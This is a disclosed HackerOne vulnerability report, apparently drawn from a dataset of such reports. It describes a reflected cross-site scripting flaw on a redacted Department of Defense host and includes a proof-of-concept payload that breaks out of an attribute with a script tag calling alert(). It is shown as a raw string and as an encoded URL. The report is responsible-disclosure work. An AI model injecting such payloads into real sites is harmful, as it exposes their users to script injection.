---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1143776'
original_report_id: '1143776'
title: XSS Reflected on https://███ (███ parameter)
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-03-31T23:22:07.758Z'
disclosed_at: '2021-07-29T19:41:36.949Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected on https://███ (███ parameter)

## Metadata

- HackerOne Report ID: 1143776
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-07-29T19:41:36.949Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Greetings, i've found an xss on https://█████ (██████████ parameter)

link : https://█████/████████?████████=%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E&██████████

Payload : 
```
"><script>alert(/frenchvlad/);</script>
```

██████

best regards,
frenchvlad

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
link : https://██████/████?████████=%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E&███████

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
